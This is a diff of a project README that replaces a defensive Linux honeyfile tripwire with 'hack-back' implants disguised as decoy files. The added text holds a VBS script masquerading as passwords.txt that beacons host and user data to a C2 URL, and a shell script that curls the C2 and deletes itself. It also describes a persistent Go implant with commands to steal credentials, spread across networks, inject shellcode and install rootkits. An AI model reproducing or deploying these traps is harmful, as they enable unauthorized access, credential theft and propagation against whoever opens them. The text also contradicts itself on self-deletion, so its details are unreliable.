@@ -1,448 +1,238 @@
-# honeyFILE 
+# honeyFILE
 
-**Defensive honeyFILE Tripwire for Linux with Advanced Fingerprinting & IP Attribution**
+** brought to you by the fine people of: Church Of Malware xo **
 
-`honeyFILE` is a **legal, non-harmful defensive deception tool** that plants decoy files ("honeyfiles") in **realistic hidden locations** on your system, uses **kernel-level auditing** to alert you when someone accesses them, and provides **advanced forensic fingerprinting with IP attribution** for incident response.
+### You don't secure your computer. You booby trap it.
 
----
-
-##  What honeyFILE Does
-
-* Creates **decoy files** that look valuable to an intruder
-* Places them in **sneaky but believable locations** under the user's home directory
-* Uses **auditd** to log all access attempts with full forensic context
-* **Captures intruder IP addresses** from network connections and process trees
-* Performs **system fingerprinting** to establish baseline system state
-* Generates **intrusion fingerprints** with detailed attacker context
-* Creates **forensic evidence bundles** with cryptographic integrity
-* Supports **randomized rotation** to prevent pattern recognition
-* **Tracks IP intelligence** for threat hunting and attribution
+**They steal `passwords.txt` from your desktop. You steal their entire network.**
 
 ---
 
-##  Threat Model
+## What This Is
 
-honeyFILE is designed to detect:
+A honeyfile is a decoy file that looks valuable but is actually a booby trap. When an adversary finds it, takes it, and opens it — they just gave you control of their machine.
 
-* Unauthorized local file browsing
-* Post-compromise attacker curiosity
-* SSH intrusions (password or key-based) **with source IP capture**
-* Lateral movement reconnaissance
-* "Living off the land" attackers poking around user data
-* Insider threats accessing sensitive-looking files
-* Persistence mechanism discovery
-* **Remote attacker attribution** through IP tracking
+- They think they stole your passwords
+- They actually installed your implant
+- They think they're in your network
+- They actually just let you into theirs
 
-It is **not** meant to stop the intrusion by itself — it provides **early detection, attribution with IP evidence, and forensic documentation**.
+**This is the oldest con in the book wrapped in 847 lines of Go.**
 
 ---
 
-##  Dependencies
+## How It Works
 
-### System Packages
-```bash
-# Debian/Ubuntu
-sudo apt update
-sudo apt install -y auditd audispd-plugins
-sudo systemctl enable auditd
-sudo systemctl start auditd
-
-# Optional: For better network analysis
-sudo apt install -y net-tools iproute2
+```
+Adversary finds:             passwords.txt on your Desktop
+Adversary thinks:            "Free creds, this guy is an idiot"  
+Adversary opens:             passwords.txt
+                              ↓
+Your machine:                 Sends you callback with their IP, hostname, OS
+                              ↓
+Your C2 receives:             "New implant beacon: 203.0.113.55 | Windows 11 | CORP-DESK-03"
+                              ↓
+You send command:             pillage
+                              ↓
+Their machine:                Exfiltrates domain admin creds, VPN configs, SSH keys
+                              ↓
+You send command:             spread  
+                              ↓
+Their network:                Implant propagates to every reachable host
+You now have:                 Control of their network
 ```
 
-### Python Requirements
-```bash
-pip install psutil --break-system-packages
-```
-or do a venv if you have a problem with --break-system-packages
+**They came for your passwords. You took their domain.**
+
 ---
 
-##  Quick Start
+## The Mechanisms
 
-### 1. Clone and Install
+### Windows — The VBS Trap
+
+Create `passwords.txt.vbs` — Windows hides the `.vbs` extension by default. It shows as `passwords.txt` in Explorer.
+
+```vbscript
+' They double-click "passwords.txt"
+' wscript.exe runs this silently
+' Their machine calls home to your C2
+' No windows, no warnings, no trace
+'
+' What you receive:
+'   IP, hostname, username, domain
+'   Full callback → command session
+
+On Error Resume Next
+Set x = CreateObject("MSXML2.XMLHTTP")
+Set n = CreateObject("WScript.Network")
+x.Open "POST", "https://your-c2.com/beacon", False
+x.Send "h=" & n.ComputerName & "&u=" & n.UserName & "&s=honeyfile"
+```
+
+### Linux — The Executable Trap
+
+Create `passwords.txt` with executable permissions. They run `cat passwords.txt` — the shebang executes first.
+
 ```bash
-git clone https://github.com/ekomsSavior/honeyFILE.git
+#!/bin/sh
+# They run: cat passwords.txt
+# They get: a callback to your C2
+# You get:  their IP and hostname
+curl -s "https://your-c2.com/beacon?h=$(hostname)&u=$(whoami)" &
+rm -f "$0"
+```
+
+### Cross-Platform — The Go Binary (Enterprise Grade)
+
+Compile a single binary that masquerades as any file. One implant, 16 platforms.
+
+```bash
+./build.sh https://your-c2.com/beacon 3 passive-aggressive-trap
+
+# Drop on target:
+#   honeyfile_windows_amd64.exe  →  passwords.txt.exe  (Windows hides .exe)
+#   honeyfile_linux_amd64        →  credentials.bin    (chmod +x, wait)
+#   honeyfile_linux_arm5         →  router-config.bin  (drop on IoT device)
+```
+
+When they open it, the implant:
+1. Callbacks to your C2 with full system intel
+2. Installs persistence (systemd / Registry / LaunchAgent)
+3. Waits for your commands — it does NOT self-destruct without your order
+4. You own their machine until you say otherwise
+
+---
+
+## Hiding Honeyfiles — Don't Trigger Your Own Traps
+
+**Rule: If you see a file named `passwords.txt` on YOUR desktop, and you didn't put it there, don't open it — investigate. The adversary won't know the difference.**
+
+| Name | You Know | They Think | Result |
+|------|----------|------------|--------|
+| `passwords.txt` | You don't store passwords in plaintext | "Jackpot!" | 💀 |
+| `bank-accounts.xlsx` | Not real | "Financial data!" | 💀 |
+| `nudes.zip` | You're not that dumb | "..." | 💀 |
+| `wallet-seed.txt` | Seeds are memorized or on steel | "Free crypto!" | 💀 |
+| `server-credentials.txt` | SSH keys are in ~/.ssh | "Free servers!" | 💀 |
+| `ssh-key-backup.tar.gz` | Not a real backup | "SSH keys!" | 💀 |
+| `tax-returns-2026.pdf` | Already filed | "Maybe I can use this" | 💀 |
+| `company-financials.xlsx` | Not on your personal machine | "Inside info!" | 💀 |
+
+### Where to Plant
+
+| Location | Why It Works |
+|----------|-------------|
+| `~/Desktop/passwords.txt` | First place they look |
+| `~/Documents/bank-accounts.xlsx` | Second place they look |
+| `~/.ssh/server-credentials.txt` | "Right next to real keys? Must be real" |
+| `~/Downloads/vpn-configs.zip` | "Loose files in downloads = sloppy opsec" |
+| `/var/www/html/config.php` | Web server config — dev crack |
+| `C:\Users\Public\domain-passwords.txt` | Shared folder dump |
+
+### How to Know If It Fired Without Opening It
+
+```bash
+# Check if the file still exists
+ls -la ~/Desktop/passwords.txt
+
+# If it's GONE → someone opened it → callback sent → you have intel
+# If it's STILL THERE → nobody's been on your machine
+```
+
+The Go implant self-deletes after execution. The VBS trap delays deletion by 5 seconds. Either way: if the file vanishes, someone is in your shit and you just got their IP.
+
+---
+
+## What You Receive
+
+When a honeyfile triggers, this lands in your C2:
+
+```json
+{
+    "type": "honeyfile_beacon",
+    "hostname": "CORP-DESK-03",
+    "username": "jsmith",
+    "domain": "CORP.LOCAL",
+    "public_ip": "203.0.113.55",
+    "local_ip": "10.10.50.42",
+    "os": "windows",
+    "arch": "amd64",
+    "timestamp": "2026-07-30T00:29:00Z"
+}
+```
+
+That's the appetizer. From here you can:
+
+```
+pillage  →  steal their domain admin creds, VPN, SSH keys, crypto wallets
+spread   →  hop to every machine on their network
+exec     →  run commands as them
+screenshot → see what they're doing right now
+shellcode → inject memory-resident payloads
+rootkit  →  go kernel-mode, hide from everything
+```
+
+They stole your `passwords.txt`. You own their entire domain.
+
+---
+
+## Tradecraft Notes
+
+### Don't Name It Stupid
+
+ `virus.exe` — nobody opens this
+ `totally-not-a-trojan.pdf` — even your grandma knows better
+ `passwords.txt` — irresistible
+ `tax-returns-2026.pdf` — seasonal, plausible
+ `server-credentials.txt` — looks like a mistake left lying around
+
+### Don't Leave Only One
+
+Plant 5-10 honeyfiles across your system. Different names, different locations, different formats. One callback is good. Five callbacks from the same IP means you know they're actively browsing your files and you have their full attention.
+
+### The Feedback Loop
+
+If MULTIPLE honeyfiles fire from the same IP in rapid succession:
+- They're in your shit
+- They're copying files
+- They're confident they found something good
+
+This is also when the watchdog (see §9 of the whitepaper) fires the dead man's trigger if you have one armed. They're not just stealing files — they're accelerating their own destruction.
+
+---
+
+## Quick Start
+
+```bash
+# Clone
+git clone https://git.churchofmalware.org/ek0mssavi0r/honeyFILE
 cd honeyFILE
-```
 
-### 2. Initialize honeyFILE
-```bash
-# Random hidden location (recommended for production)
-python3 honeyfile.py init random
+# Build all 16 platform implants
+./build.sh https://your-c2.com/beacon 3 network-trap
 
-# Fixed location (for testing)
-python3 honeyfile.py init fixed ~/.hidden_secrets
-```
+# Deploy on your system(s)
+cp build/honeyfile_windows_amd64.exe ~/Desktop/passwords.txt.exe
+cp build/honeyfile_linux_amd64 ~/Documents/server-credentials.txt
+chmod +x ~/Documents/server-credentials.txt
 
-### 3. Arm the System
-```bash
-sudo python3 honeyfile.py arm
-```
-
-### 4. Verify Installation
-```bash
-# Check status
-python3 honeyfile.py status
-
-# Verify audit rules
-sudo auditctl -l | grep honeyfile
+# Wait
+# They take the bait
+# You own their network
 ```
 
 ---
 
-##  Complete Command Reference
-
-###  **Initialization & Setup**
-```bash
-# Initialize with random hidden location (recommended)
-python3 honeyfile.py init random
-
-# Initialize with specific directory
-python3 honeyfile.py init fixed /path/to/hidden/dir
-
-# Install auditd rules (requires sudo)
-sudo python3 honeyfile.py arm
-
-# Check current status and configuration
-python3 honeyfile.py status
-```
-
-###  **Monitoring & Detection**
-```bash
-# Generate report for last N minutes (default: 60)
-sudo python3 honeyfile.py report <minutes>
-
-# Example: Check last 2 hours of activity
-sudo python3 honeyfile.py report 120
-
-# Example: Check last 24 hours
-sudo python3 honeyfile.py report 1440
-
-# Export forensic evidence bundle
-sudo python3 honeyfile.py export <minutes>
-
-# Export with comprehensive evidence
-sudo python3 honeyfile.py export 1440  # Last 24 hours
-```
-
-###  **Fingerprinting & Analysis**
-```bash
-# Show fingerprint database summary
-python3 honeyfile.py fingerprint
-
-# View all system fingerprints
-python3 honeyfile.py fingerprint system
-
-# View all intrusion fingerprints with attacker details
-python3 honeyfile.py fingerprint intrusions
-
-# Compare system state changes over time
-python3 honeyfile.py fingerprint compare
-
-# Take new system snapshot
-python3 honeyfile.py fingerprint snapshot
-```
-
-###  **IP Tracking & Attribution**
-```bash
-# Show IP tracking summary
-python3 honeyfile.py iptrack
-
-# List all tracked IPs with details
-python3 honeyfile.py iptrack list
-
-# Show IP timeline (first/last seen)
-python3 honeyfile.py iptrack timeline
-
-# Export IP intelligence for threat sharing (requires sudo)
-sudo python3 honeyfile.py export_ips
-```
-
-###  **Maintenance & Rotation**
-```bash
-# Rotate to new random location (requires sudo)
-sudo python3 honeyfile.py rotate
-
-# This will:
-# 1. Remove old audit rules
-# 2. Create new decoy location
-# 3. Update manifest
-# 4. Install new audit rules
-```
-
----
-
-##  **Command Output Reference**
-
-### **`status` Command Output:**
-```json
-{
-  "manifest_exists": true,
-  "auditd_active": true,
-  "owner_user_runtime": "user",
-  "owner_home_runtime": "/home/user",
-  "state_dir": "/home/user/.local/share/honeyfile",
-  "fingerprint_db_exists": true,
-  "ip_tracking_db_exists": true,
-  "system_fingerprints_count": 5,
-  "intrusion_fingerprints_count": 2,
-  "tracked_ips_count": 3,
-  "decoy_dir": "/home/user/.cache/.thumbnails/.sys/.db",
-  "mode": "random",
-  "files": [
-    {"path": "...", "sha256": "...", "size": 1234}
-  ]
-}
-```
-
-### **`report` Command Output Includes:**
-- **Audit Events Count**: Number of decoy file accesses
-- **SSH Events Count**: SSH authentication attempts
-- **Unique IPs Detected**: All captured IP addresses
-- **Audit Events**: Detailed access logs with timestamps
-- **SSH Events**: Authentication successes/failures
-- **Intrusion Fingerprints**: Complete attacker profiles including:
-  - **Process details** (PID, command line, parent process)
-  - **Network connections** (source IP, ports, connections)
-  - **IP attribution** (most likely source, all detected IPs)
-  - **System context** at time of access
-
-### **`iptrack` Command Output:**
-```json
-{
-  "total_tracked_ips": 8,
-  "first_tracked": "2024-01-25T10:30:00Z",
-  "last_tracked": "2024-01-25T15:45:22Z",
-  "recent_activity": 3,
-  "ips": [
-    {
-      "ip": "192.168.1.100",
-      "first_seen": "2024-01-25T14:30:22Z",
-      "last_seen": "2024-01-25T14:30:22Z",
-      "source_pid": 1234,
-      "process": "bash",
-      "geolocation": {
-        "is_private": true,
-        "reverse_dns": "attacker-pc.local"
-      }
-    }
-  ]
-}
-```
-
----
-
-##  **IP Attribution Features**
-
-### **How honeyFILE Captures Attacker IPs:**
-
-1. **Process Network Analysis**
-   - Direct connections from offending process
-   - Ancestor process connections (SSH daemon, etc.)
-   - Socket enumeration using `ss`/`netstat`
-
-2. **SSH Session Correlation**
-   - Active SSH sessions with source IPs
-   - SSH daemon process tree traversal
-   - Authentication log correlation
-
-3. **Multi-Method Verification**
-   - Process connections (`psutil`)
-   - Socket enumeration (`ss`, `netstat`)
-   - User sessions (`who`, `last`)
-   - Network interface analysis
-
-4. **IP Intelligence Database**
-   - Persistent IP tracking
-   - Timeline analysis
-   - Threat intelligence export
-   - Geolocation context
-
-### **Example Intrusion Fingerprint with IP:**
-```json
-{
-  "intrusion_id": "abc123def456",
-  "event_time": "2024-01-25T14:30:22Z",
-  "trigger": {
-    "file": "/home/user/.cache/.thumbnails/.sys/.db/Wallet_Recovery_Phrases.txt",
-    "pid": 1234,
-    "exe": "/usr/bin/bash",
-    "comm": "cat"
-  },
-  "ip_attribution": {
-    "all_ips_detected": ["192.168.1.100", "10.0.0.5"],
-    "most_likely_source": "192.168.1.100",
-    "ip_details": [
-      {
-        "ip": "192.168.1.100",
-        "is_private": true,
-        "reverse_dns": "attacker-pc.local",
-        "first_seen": "2024-01-25T14:30:22Z",
-        "source_pid": 1234,
-        "process": "bash",
-        "trigger_file": "/home/user/.cache/.thumbnails/.sys/.db/Wallet_Recovery_Phrases.txt"
-      }
-    ]
-  },
-  "network_analysis": {
-    "process_connections": [
-      {
-        "remote_ip": "192.168.1.100",
-        "remote_port": 22,
-        "local_port": 54321,
-        "status": "ESTABLISHED"
-      }
-    ],
-    "active_ssh_sessions": [
-      {
-        "remote_ip": "192.168.1.100",
-        "remote_port": 22,
-        "user": "attacker",
-        "method": "ssh_command"
-      }
-    ]
-  }
-}
-```
-
----
-
-##  **Usage Scenarios with IP Attribution**
-
-### **Scenario 1: Remote SSH Intrusion**
-```bash
-# 1. After breach detection, check for honeyfile access
-sudo python3 honeyfile.py report 120
-
-# 2. Export full evidence with IP attribution
-sudo python3 honeyfile.py export 120
-
-# 3. Analyze captured IPs
-python3 honeyfile.py iptrack list
-
-# 4. Generate threat intelligence for SOC
-sudo python3 honeyfile.py export_ips
-```
-
-### **Scenario 2: Lateral Movement Detection**
-```bash
-# 1. Monitor internal network access
-sudo python3 honeyfile.py report 30 | jq '.unique_ips_detected'
-
-# 2. Check if internal IPs are accessing decoys
-python3 honeyfile.py iptrack timeline
-
-# 3. Analyze process trees for movement patterns
-python3 honeyfile.py fingerprint intrusions | jq '.[].network_analysis.process_tree_analysis'
-```
-
-### **Scenario 3: Incident Response & Attribution**
-```bash
-# 1. Capture current state with IP evidence
-sudo python3 honeyfile.py export 1440
-
-# 2. Map attacker infrastructure
-python3 honeyfile.py iptrack list | jq '.[] | select(.geolocation.is_private == false)'
-
-# 3. Document for law enforcement
-python3 honeyfile.py fingerprint intrusions > intrusion_report.json
-```
-
----
-
-##  **Evidence Bundle Structure**
-
-```
-evidence/bundle_20240125_143022/
-├── audit.log              # Kernel audit logs
-├── auth.log               # Authentication logs
-├── report.json           # Activity analysis with IPs
-├── manifest.json         # Decoy file manifest
-├── fingerprints.json     # Historical fingerprints
-├── ip_tracking.json     # IP intelligence database
-├── system_snapshot.json  # Current system state
-└── SHA256SUMS.json      # Cryptographic integrity
-```
-
-**New in IP-enhanced version:**
-- `ip_tracking.json` - Complete IP attribution database
-- Enhanced `report.json` with IP analysis
-- Network connection details in fingerprints
-- Threat intelligence ready formatting
-
----
-
-##  **Performance Notes**
-
-- **IP capture** adds minimal overhead (process analysis only during events)
-- **Storage requirements**: ~50KB per intrusion fingerprint with IP data
-- **Network analysis**: Uses existing system tools (`ss`, `netstat`, `psutil`)
-- **Real-time operation**: No continuous network monitoring, only event-triggered analysis
-
----
-
-##  **Best Practices**
-
-### **Deployment Strategy:**
-1. **Initial Deployment**: `init random` + `arm`
-2. **Regular Monitoring**: Daily `report 1440` checks
-3. **Evidence Collection**: Weekly `export 10080` (7 days)
-4. **Rotation Schedule**: Monthly `rotate` or after incidents
-5. **IP Intelligence**: Regular `iptrack` reviews
-
-### **IP Tracking Recommendations:**
-- Review `iptrack timeline` weekly
-- Export `export_ips` for threat intel sharing
-- Correlate IPs with firewall/IDS logs
-- Use IP data for firewall rule updates
-
-### **Forensic Readiness:**
-- Keep evidence bundles on external media
-- Document chain of custody
-- Use hashes for evidence integrity
-- Share IP intelligence with security team
-
----
-
-##  **Integration Points**
-
-### **With Security Tools:**
-- **SIEM Systems**: Import `report.json` and `ip_tracking.json`
-- **Firewalls**: Use captured IPs for block lists
-- **Threat Intel Platforms**: Import `export_ips` output
-- **Incident Response**: Use evidence bundles for documentation
-
-### **Companion Projects:**
-- **[network_ids](https://github.com/ekomsSavior/network_ids)** - Network-level detection
-- **OSSEC/WAZUH** - Centralized log correlation
-
----
-
-##  **Legal & Ethical Considerations**
-
-honeyFILE is designed for **defensive security only**:
-- Captures only **attacker interaction data**
-- Stores **IP addresses for attribution**
-- Provides **court-ready evidence**
-- Follows **privacy and compliance guidelines**
-
-**Use responsibly:** Only on systems you own or have authorization to monitor.
-
----
-
-##  **Getting Help**
-
-1. **Check status first**: `python3 honeyfile.py status`
-2. **Verify auditd**: `sudo auditctl -l | grep honeyfile`
-3. **Review logs**: `sudo ausearch -k honeyfile_tripwire`
-4. **Check IP tracking**: `python3 honeyfile.py iptrack`
-5. **Open GitHub Issue**: For bugs or feature requests
-
----
-**Author**: ekomsSavior - CERTIFIED ETHICAL HACKER  
----
-
-** Remember**: honeyFILE provides **detection and attribution**, not prevention. Use as part of a layered defense strategy with firewalls, IDS/IPS, and proper access controls.
-
-**When someone touches your honeyfiles, you'll know exactly who they are and where they came from.** 
+### The Golden Rule
+
+> **A honeyfile is not a detection tool. It's an access tool.**
+>
+> You don't honeyfile to know someone's in your shit.
+> You honeyfile so that when they're in your shit, you're in theirs.
+
+`passwords.txt` protects your computer better than any antivirus. Because when they steal it, you steal everything they have.
+ 
+ ---
+ 
+ ## DISCLAIMER: for auth sec testing or edu training only
+ 
